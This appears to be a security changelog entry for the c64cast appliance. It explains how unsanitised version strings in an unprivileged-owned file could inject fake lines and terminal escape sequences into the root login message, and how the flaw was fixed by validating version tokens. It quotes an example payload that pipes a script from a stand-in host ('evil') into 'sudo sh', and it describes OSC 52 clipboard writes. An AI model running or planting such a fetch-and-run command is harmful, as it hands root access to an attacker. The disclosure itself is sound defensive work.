- **The appliance's login MOTD rendered two unsanitized strings from a file
  a lower-privileged account owns.**
  `packaging/systemd/c64cast-update-check.service` writes
  `update_check.json` as the unprivileged `c64cast` account, while
  `packaging/motd/98-c64cast-update` prints `c64cast --motd-line` from
  `/etc/update-motd.d/`, which pam_motd runs as **root** at every login —
  and the unit's own comment requires both surfaces to resolve the same
  file, so the working configuration is precisely the one where a
  low-privilege account owns a file root reads. `read_update_state` coerced
  `running_version` and `latest_version` with a bare `str()`, imposing no
  charset or length constraint, and both were interpolated straight into
  that line: a `"latest_version"` of `"0.5.0\nSECURITY: apply the hotfix
  now: curl -s http://evil/p.sh | sudo sh\n"` rendered as an additional,
  official-looking MOTD line at every root login, and ESC/OSC payloads went
  further — erasing or rewriting the surrounding banner, and on terminals
  honoring OSC 52 writing the admin's clipboard. Both fields must now match
  a plausible version token, which is also the gate `upgrade.latest_release`
  applies to PyPI's own answer, so nothing shaped unlike a version is ever
  written or read back. (The web console was never affected — it binds these
  values as text nodes, so the terminal is the one sink that acts on control
  bytes.)
